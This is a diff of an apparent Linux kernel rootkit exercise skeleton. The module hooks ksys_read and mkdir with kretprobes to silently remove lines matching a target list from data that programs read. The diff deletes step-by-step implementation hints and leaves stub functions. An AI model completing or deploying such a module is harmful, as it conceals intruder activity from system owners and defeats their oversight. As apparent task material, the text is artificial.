@@ -22,29 +22,17 @@ struct rk_target_list {
 
 static struct rk_target_list content_targets;
 
-/* TODO: Implement rk_target_add(list, name)
- * spin_lock_irqsave, check count < max, strscpy, count++, spin_unlock_irqrestore
- */
+// Implement add, remove, and line_matches for the target list.
+
 static int rk_target_add(struct rk_target_list *list, const char *name)
 {
-	/* TODO: implement */
 	return -ENOSYS;
 }
 
-/* TODO: Implement rk_target_remove(list, idx)
- * spin_lock_irqsave, validate idx, memmove to close gap, count--, spin_unlock_irqrestore
- */
 static int rk_target_remove(struct rk_target_list *list, int idx)
 {
-	/* TODO: implement */
 	return -ENOSYS;
 }
-
-/* TODO: Implement line_matches(list, line, len)
- * Acquire spinlock. Iterate content_targets.
- * Use strnstr(line, target, len) for each entry.
- * Return true if any match, false otherwise.
- */
 
 /* ---- ksys_read interception ---- */
 
@@ -53,30 +41,15 @@ struct read_data {
 	size_t count;
 };
 
-/* TODO: Implement read_entry(ri, regs)
- * ksys_read is not a syscall wrapper: args are directly in regs.
- * Save user buffer pointer from regs->si and count from regs->dx into ri->data.
- */
 static int read_entry(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	/* TODO: implement */
+	// Save the user-space buffer pointer and count.
 	return 0;
 }
 
-/* TODO: Implement read_return(ri, regs)
- * Get total from regs_return_value. If <= 0, return.
- * If content_targets.count == 0, skip (no work to do).
- * kmalloc a kernel buffer, copy_from_user.
- * Walk line by line: use memchr to find '\n'.
- *   line_len = (nl found) ? (nl - pos + 1) : (end - pos)
- *   If line_matches: memmove to close gap, subtract line_len from new_total.
- *   Else: advance pos by line_len.
- * If total changed: copy_to_user, regs_set_return_value.
- * kfree.
- */
 static int read_return(struct kretprobe_instance *ri, struct pt_regs *regs)
 {
-	/* TODO: implement */
+	// Filter matching lines from the read buffer.
 	return 0;
 }
 
@@ -195,15 +168,14 @@ static int __init rk_init(void)
 
 	spin_lock_init(&content_targets.lock);
 
-	/* TODO: Register the read kretprobe. */
-	/* TODO: Register the mkdir kretprobe. On failure, unregister read. */
+	// Register read and mkdir probes with goto rollback.
 
 	return 0;
 }
 
 static void __exit rk_exit(void)
 {
-	/* TODO: Unregister mkdir kretprobe, then read kretprobe. */
+	// Unregister probes in reverse order.
 }
 
 module_init(rk_init);
